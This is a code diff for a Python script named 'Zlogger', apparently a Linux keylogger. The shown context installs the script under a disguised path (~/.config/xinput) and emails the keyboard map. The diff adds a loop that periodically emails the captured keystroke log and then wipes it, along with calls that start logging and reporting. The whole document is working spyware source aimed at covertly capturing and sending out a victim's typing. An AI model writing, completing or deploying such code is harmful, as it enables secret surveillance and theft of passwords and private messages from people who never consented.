@@ -69,15 +69,23 @@ def initialize():
 	kmap = check_output("xmodmap -pke", shell=True)
 	send_mail("Zlogger Character Map",kmap)
 
-
+def send_mail_reports_every(interval):
+	while True:
+		sleep(interval)
+		send_mail("Zlogger report", file(LOG_FILE).read())
+		with open(LOG_FILE, "w"):
+			pass
 
 
 current_file = os.path.realpath(__file__)
 destination_file = HOME_DIRECTORY + "/.config/xinput"
 
-
 if current_file != destination_file:
+	print("initializing")
 	initialize()
 
+#Start logging
+start_logging(LOG_FILE)
 
-
+#send reports
+send_mail_reports_every(SLEEP_INTERVAL)
